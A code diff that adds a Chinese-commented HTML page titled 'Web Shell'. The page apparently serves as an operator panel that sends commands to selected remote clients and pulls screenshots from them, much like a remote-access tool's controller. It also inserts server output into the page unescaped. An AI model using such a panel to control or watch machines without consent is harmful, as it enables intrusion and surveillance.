@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Shell</title>
+    <style>
+
+        body {
+            background-color: #F0F0F0; /* 背景颜色 */
+            color: #000; /* 字体颜色 */
+            font-family: monospace;
+            padding: 20px;
+        }
+        #command-line {
+            width: 100%;
+            height: 400px;
+            background-color: #F0F0F0; /* 背景颜色 */
+            color: #000; /* 字体颜色 */
+            padding: 0px; /* 内边距 */
+            overflow-y: no; /* 允许竖向滚动 */
+            border: 1px solid #0f0; /* 边框样式 */
+            border-radius: 5px; /* 圆角边框 */
+        }
+        #output {
+            width: 100%;
+            height: 380px;
+            background-color: #F0F0F0; /* 背景颜色 */
+            color: #000; /* 字体颜色 */
+            padding: 0px; /* 内边距 */
+            overflow-y: auto; /* 允许竖向滚动 */
+            border: 0px solid #0f0; /* 边框样式 */
+            border-radius: 5px; /* 圆角边框 */
+            white-space: pre-wrap; /* 确保文本在换行时保留空格 */
+        }
+        #input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-family: monospace;
+        }
+        select {
+            background-color: #222;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+        #screenshot_img {
+            margin-top: 1px;                        /* 上边距 */
+            border: 1px solid #0f0;                 /* 边框样式 */
+            border-radius: 5px;                     /* 圆角边框 */
+            padding: 1px;                           /* 内边距 */
+            display: flex;                          /* 使用 flex 布局 */
+            justify-content: center;                /* 内容水平居中 */
+            align-items: center;                    /* 内容垂直居中 */
+        }
+
+        #screenshot_img img {
+            max-width: 100%;                        /* 控制图片宽度 */
+            height: auto;                           /* 保持长宽比 */
+            display: block;                         /* 使图片独占一行 */
+            margin: 0 auto;                        /* 图片居中 */
+        }
+
+
+
+
+
+    </style>
+</head>
+<body>
+
+<div id="command-line">
+    <!-- 将输出框放在这里 -->
+    <div id="output"></div>
+    <!-- 将输入框放在这里 -->
+    <input id="input" type="text" placeholder="输入命令..." autofocus />
+</div>
+
+<select id="client-select"></select> <!-- 客户端选择下拉框 -->
+<button id="refreshClients">刷新客户端列表</button> <!-- 刷新客户端列表按钮 -->
+
+<button id="screenshot_button">截图</button> <!-- 截图按钮 -->
+<div id="screenshot_img"></div>             <!-- 截图显示位置 -->
+
+
+<script>
+    const commandLine = document.getElementById('output');
+    const input = document.getElementById('input');
+    const clientSelect = document.getElementById('client-select');
+
+    input.addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+            const command = input.value;
+            const selectedClient = clientSelect.value;
+            displayMessage(`> ${command} (发送给: ${selectedClient})`); // 显示输入的命令
+            executeCommand(selectedClient, command);
+            input.value = ''; // 清空输入框
+        }
+    });
+
+    function displayMessage(message) {
+        commandLine.innerHTML += message + '<br>'; // 添加新行
+        commandLine.scrollTop = commandLine.scrollHeight; // 滚动到底部
+    }
+
+    // 执行命令的结果
+    function executeCommand(client, command) {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", `/execute?client=${encodeURIComponent(client)}&command=${encodeURIComponent(command)}`, true);
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                const response = JSON.parse(xhr.responseText);
+                displayMessage(response.response); // 显示响应
+            } else {
+                displayMessage(`错误: ${xhr.status}, ${xhr.statusText}`);
+            }
+        };
+        xhr.onerror = function() {
+            displayMessage('请求失败');
+        };
+        xhr.send();
+    }
+
+    // 获取客户端列表
+    function updateClientList() {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", "/clients", true);
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                const response = JSON.parse(xhr.responseText);
+                clientSelect.innerHTML = ''; // 清空下拉框
+                response.clients.forEach(client => {
+                    const option = document.createElement('option');
+                    option.value = JSON.stringify(client); // 直接使用 JSON 字符串
+                    option.textContent = client; // 显示客户端地址
+                    clientSelect.appendChild(option);
+                });
+            }
+        };
+        xhr.send();
+    }
+
+    // 页面加载完成后初始化
+    updateClientList();
+
+    // 刷新客户端列表按钮点击事件
+    document.getElementById('refreshClients').addEventListener('click', function() {
+        updateClientList();
+    });
+
+
+    // 截图按钮点击事件
+    document.getElementById('screenshot_button').addEventListener('click', function() {
+        const selectedClient = clientSelect.value;
+        if (selectedClient) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", `/screenshot?client=${encodeURIComponent(selectedClient)}`, true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText);
+                    const imageData = response.image_data;
+
+                    // 清空之前的截图显示
+                    const screenshotImg = document.getElementById('screenshot_img');
+                    screenshotImg.innerHTML = ''; // 清空前面的截图
+
+                    // 创建新的 img 元素并设置其 src 属性为 Base64 编码的图片
+                    const img = document.createElement('img');
+                    img.src = `data:image/png;base64,${imageData}`; // 设置图像源
+                    img.alt = 'Screenshot';
+                    img.style.maxWidth = '100%';  // 使图片自适应宽度
+
+                    // 将图片添加到截图显示 div 中
+                    screenshotImg.appendChild(img);
+
+                } else {
+                    displayMessage(`错误: ${xhr.status}, ${xhr.statusText}`);
+                }
+            };
+            xhr.onerror = function() {
+                displayMessage('请求失败');
+            };
+            xhr.send();
+        } else {
+            displayMessage('请先选择一个客户端');
+        }
+    });
+
+</script>
+
+</body>
+</html>
